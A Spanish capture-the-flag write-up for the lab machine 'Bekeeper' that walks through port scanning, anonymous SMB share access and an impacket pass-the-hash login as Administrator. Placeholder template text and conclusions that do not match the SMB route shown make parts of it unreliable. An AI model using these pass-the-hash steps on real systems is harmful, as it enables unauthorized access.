#  >_ Bekeeper



| Propiedad | Detalle |
| :--- | :--- |
| **Plataforma** | Whoamilabs |
| **Dificultad** | 🟡 Media |
| **OS** | Linux |
| **IP de la Máquina** | `172.17.0.2` |
| **Fecha de resolución** | 2026-11-11 |

---

📝 Descripción

Máquina enfocada en la explotación de un servicio web vulnerable y posterior escalada de privilegios.

---


## 🔍 1. Fase de Reconocimiento y Enumeración

### Escaneo de Puertos (`nmap`)
Lanzamos un escaneo inicial para identificar los puertos abiertos y los servicios activos en la máquina objetivo:

```bash
sudo nmap -p- --open --min-rate=5000 -n -Pn 172.17.0.2 -oN allPorts.txt
```

<img width="1119" height="365" alt="Escaneo puertos abiertos" src="https://github.com/user-attachments/assets/05b12950-c59d-4f37-b5c9-df0905f4bb11" />



**Resultados del escaneo:**
* **Puerto 21/TCP**: ftp
* **Puerto 25/TCP**: smtp
* **Puerto 80/TCP**: http
* **Puerto 110/TCP**:  pop3
* **Puerto 139/TCP**: netbios
* **Puerto 445/TCP**: microsoft-ds
* **Puerto 6379/TCP**: redis
* **Puerto 8888/TCP**: sun-answerbook


Realizamos un escaneo más profundo de los servicios encontrados:
```bash
nmap -p 21,25,80,110,139,445,6379,8888 -sCV 172.17.0.2 -oN targeted
```


<img width="1553" height="895" alt="Escaneo de puertos" src="https://github.com/user-attachments/assets/57840bf8-0b6c-4d89-bedb-a767afdd33fd" />



### Enumeración Web (Puerto 80)
Al inspeccionar el sitio web, nos encontramos con la siguiente interfaz:
<img width="1575" height="941" alt="3web" src="https://github.com/user-attachments/assets/79797ab2-2cbf-4a69-89e9-aa1b746d9a0f" />



---

## 💥 2. Fase de Explotación 

<img width="1323" height="235" alt="4smb" src="https://github.com/user-attachments/assets/265e45e0-67d2-4b85-b047-87a25bd8e245" />

<img width="818" height="232" alt="5smb in" src="https://github.com/user-attachments/assets/86236c8f-f39a-4a81-bfc1-c741565a93cf" />

<img width="951" height="219" alt="6mio" src="https://github.com/user-attachments/assets/6a38db46-67fa-4cce-b519-954bd6572f36" />


<img width="775" height="76" alt="7hashes" src="https://github.com/user-attachments/assets/d26346a4-6192-475b-a1a7-a55d81806e78" />


smbclient -L //172.17.0.2 -N
smbclient //172.17.0.2/backups -N


---

## 👑 3. Escalada de Privilegios

### Enumeración del Sistema
Analizamos el entorno buscando vectores comunes de escalada (permisos SUID, tareas Cron, capacidades, contraseñas en texto plano).


### Explotación del Vector de Escalada
Encontrado un binario o configuración débil. Explicar cómo se abusa de ello para convertirse en `root`......

<img width="1589" height="582" alt="8impacket" src="https://github.com/user-attachments/assets/61ae977a-36c8-41e8-9724-194eb9ee99c7" />

```bash
python3 /usr/share/doc/python3-impacket/examples/smbclient.py Administrator@172.17.0.2 -hashes :B9D34993351605B1D7B58D6D219F41A7
```

use C$


<img width="1133" height="279" alt="9nohayna" src="https://github.com/user-attachments/assets/b69ef795-6c5b-4371-a703-960708d3e36b" />

<img width="586" height="159" alt="10rootflag" src="https://github.com/user-attachments/assets/d81162fb-13f4-470b-85fd-41ba891ec47c" />

<img width="569" height="565" alt="flag" src="https://github.com/user-attachments/assets/7706915a-73a4-4341-bb0c-e455277b2d4b" />


---

## 🏁 4. Conclusiones y Mitigación
* **Vulnerabilidad Principal**: Falta de sanitización en los parámetros web de entrada / Binarios con permisos SUDO mal configurados.
* **Remediación**: Actualizar los servicios vulnerables, implementar *whitelisting* en los inputs y aplicar el principio de menor privilegio retirando accesos SUDO innecesarios.





